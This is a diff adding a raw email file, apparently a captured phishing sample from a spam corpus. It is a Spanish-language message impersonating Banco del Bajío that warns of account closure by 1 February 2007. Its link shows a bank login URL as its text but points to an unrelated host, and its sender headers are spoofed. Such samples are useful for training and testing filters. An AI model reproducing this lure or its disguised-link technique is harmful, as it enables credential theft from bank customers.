@@ -1,0 +1,112 @@
+From nobody Sun Jan 25 13:50:01 2015
+Return-Path: <info@tiba-welt.de>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 1FFA94692D
+ for <user@login.example.com>; Tue, 30 Jan 2007 20:15:28 -0500 (EST)
+Received: from lujan.uninet.edu (bio.hgy.es [193.146.180.21])
+ by mail.example.org (Postfix) with ESMTP id ACCBA131FDC4
+ for <user@example.com>; Tue, 30 Jan 2007 20:15:27 -0500 (EST)
+Received: by lujan.uninet.edu (Postfix)
+ id 2945F1C2AB; Wed, 31 Jan 2007 02:15:25 +0100 (CET)
+Delivered-To: umeet@uninet.edu
+Received: from mar.uninet.edu (mar.uninet.edu [193.146.180.108])
+ by lujan.uninet.edu (Postfix) with ESMTP id C196F1C260
+ for <umeet@uninet.edu>; Wed, 31 Jan 2007 02:15:24 +0100 (CET)
+Received: from localhost (localhost [127.0.0.1])
+ by mar.uninet.edu (Postfix) with ESMTP id B2A586D7
+ for <umeet@uninet.edu>; Wed, 31 Jan 2007 02:15:24 +0100 (CET)
+Received: from lujan.uninet.edu ([193.146.180.21])
+ by localhost (mar [193.146.180.108]) (amavisd-new, port 10024)
+ with ESMTP id 15179-10 for <umeet@uninet.edu>;
+ Wed, 31 Jan 2007 02:15:10 +0100 (CET)
+Received: from server021.webpack.hosteurope.de
+ (server021.webpack.hosteurope.de [80.237.130.29])
+ by lujan.uninet.edu (Postfix) with ESMTP id 232ED1BF02
+ for <umeet@uninet.edu>; Wed, 31 Jan 2007 02:14:57 +0100 (CET)
+Received: from nobody by server021.webpack.hosteurope.de running ExIM using
+ local id 1HC43n-0003sw-Ff; Wed, 31 Jan 2007 02:14:51 +0100
+To: umeet@uninet.edu
+Subject: Posible fraude con su cuenta de Banco del Bajío, S. A.
+From: Servicio@uninet.edu, de@uninet.edu, Banco@uninet.edu,
+	del@uninet.edu, Bajío@uninet.edu, S.A. <webmaster@bb.com.mx>
+Reply-To: webmaster@bb.com.mx
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1HC43n-0003sw-Ff@server021.webpack.hosteurope.de>
+Date: Wed, 31 Jan 2007 02:14:51 +0100
+X-bounce-key: webpack.hosteurope.de;info@tiba-welt.de;1170206110;6ba5b6ef;
+X-Virus-Scanned: by amavisd-new-20030616-p10 at uninet.edu
+X-Amavis-Alert: BAD HEADER Non-encoded 8-bit data (char ED hex) in message
+ header 'Subject'
+ Subject: ...raude con su cuenta de Banco del Baj\355o, S. A.\n ^
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 725
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Estimado Cliente</title>
+</head>
+
+<body>
+
+<table cellSpacing="0" cellPadding="0" width="100%" bgColor="#dbeaf5" border="0" id="table1">
+	<tr>
+		<td vAlign="top" width="100%">
+		<table height="209" width="100%" bgColor="#ffffff" id="table2">
+			<tr>
+				<td vAlign="top">
+				<table cellSpacing="8" cellPadding="0" width="100%" align="center" border="0" nowrap id="table3">
+					<tr>
+						<td>
+						<div>
+							<img src="http://www.cna.org.mx/dtorio/148_archivos/image003.gif" width=153 height=40>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+							<p>
+							  <font size="-2" face="Verdana, Arial, Helvetica, sans-serif">Estimado Cliente,</font></p>
+					<p align="justify"><font size="-2" face="Verdana, Arial, Helvetica, sans-serif">
+  Según nuestros registros informáticos, hemos detectado recientemente que los accesos a su cuenta a través de Banca en la Red han sido efectuados desde diferentes direcciones IP. Esto probablemente se deba a que la dirección IP de su computador es dinámica y varía constantemente, o debido a que usted ha utilizado más de un computador para acceder a su cuenta. Debido a este suceso y en cumplimiento con la nueva normativa vigente, hemos actualizado nuestros sistemas informáticos para brindar una mayor seguridad a nuestros clientes, por lo cual necesitaremos que ingrese en su cuenta y efectúe una verificación de su actividad reciente. Los procedimientos de seguridad requieren que usted verifique la actividad en su cuenta antes del <font color="#FF0000"><b>1 de Febrero del 2007</b></font>. Transcurrida esa fecha, el sistema informático automatizado dara de baja su cuenta. Así mismo, le recordamos que este correo no es para verificar los datos de su tarjeta, es solo para verifica
+ r la actividad. De ante mano le agradecemos su cooperación en est</font><font size="-2" face="Verdana, Arial, Helvetica, sans-serif">e aspecto.</font></p>
+							<p align="justify"><font size="-2" face="Verdana, Arial, Helvetica, sans-serif">Para ingresar a su cuenta a través de Banca en la 
+							  Red y verificar la actividad de la misma, debe 
+							  utilizar el siguiente enlace: </font></p>
+							<p align="justify">
+							  <font size="-2" face="Verdana, Arial, Helvetica, sans-serif"><a href="http://www.ajbegin.com/record/www.bb.com.mx/">https://secure4.bb.com.mx/userbb/login/</a></font></p>
+							<layer id="dep2" onMouseOver="clear_delayhide();" onMouseOut="ResetMenuInfNS4();" name="dep2" width="600px">							</layer>
+						  </ILAYER>
+							<form name="PagoRecSegLogin" method="post">
+								<table cellSpacing="0" cellPadding="0" width="770" border="0" id="table4">
+									<tr>
+										<td width="84%">
+										<table cellSpacing="0" cellPadding="0" width="100%" border="0" id="table5">
+											<tr>
+												<td colSpan="2">
+												<table height="150" cellSpacing="0" cellPadding="0" width="100%" border="0" id="table6">
+												</table>												</td>
+											</tr>
+										</table>										</td>
+									</tr>
+								</table>
+							</form>
+							<p></div>
+						</td>
+					</tr>
+				</table>
+				</td>
+			</tr>
+		</table>
+		</td>
+	</tr>
+</table>
+
+</body>
+
+</html>
+
+
